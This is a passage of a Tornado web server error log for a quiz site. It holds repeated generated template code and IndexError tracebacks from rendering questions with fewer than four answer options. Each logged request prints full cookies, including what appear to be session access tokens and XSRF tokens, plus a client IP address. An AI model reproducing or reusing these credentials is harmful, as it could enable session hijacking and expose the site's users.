 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059f7ab8e4c85480ff4f8c2&answers=%5B3%5D&cursor=0&_xsrf=b032c94960104451b21c1d9bfef33d34', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=b032c94960104451b21c1d9bfef33d34; access_token="QUFBRzZsTmNzNkdjQkFGb1pDU2hRVFN0bFh2cUlVVTI5TkdRSUlNMjhneVpCYUFaQk16VGxHNFJ6RzVEc0lORUZIMUVvUDIxbkdWbm50aG5xdk0waDQzZHNtMnl3amRpanhDd2oyUTdnZ1pEWkQ=|1348073072|5b066f29f0211c97ef09fb8bd1697201e430b83e"; __utma=188782963.1383997649.1347899066.1348070020.1348072429.7; __utmb=188782963.16.10.1348072429; __utmc=188782963; __utmz=188782963.1347899066.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 103.19ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059f7ab8e4c85480ff4f8c2&answers=%5B3%5D&cursor=5&_xsrf=b032c94960104451b21c1d9bfef33d34', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=b032c94960104451b21c1d9bfef33d34; access_token="QUFBRzZsTmNzNkdjQkFGb1pDU2hRVFN0bFh2cUlVVTI5TkdRSUlNMjhneVpCYUFaQk16VGxHNFJ6RzVEc0lORUZIMUVvUDIxbkdWbm50aG5xdk0waDQzZHNtMnl3amRpanhDd2oyUTdnZ1pEWkQ=|1348073072|5b066f29f0211c97ef09fb8bd1697201e430b83e"; __utma=188782963.1383997649.1347899066.1348070020.1348072429.7; __utmb=188782963.16.10.1348072429; __utmc=188782963; __utmz=188782963.1347899066.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 139.37ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059fbd68e4c854816f4873c&answers=%5B3%5D&cursor=0&_xsrf=33b2d3e110e74840bbd7358e87564a72', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=33b2d3e110e74840bbd7358e87564a72; access_token=QUFBRzZsTmNzNkdjQkFCR1haQU1zTjdScmxHU0liSWkxSTZsWkJJUThaQkJOVE1NRXRuejBscm5aQkRsT05NaHJ2UG42QlpBWkJSNWFUTWtTS2I4dUVxQjFUTVhvMkRkS1EwTnRZWkFmeXdRTVFaRFpE|1348074430|5a5230fb3bbcf0ad46d398116597e2bc36440484; __utma=188782963.2143483449.1347970376.1347975978.1348074412.3; __utmb=188782963.5.10.1348074412; __utmc=188782963; __utmz=188782963.1347970376.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
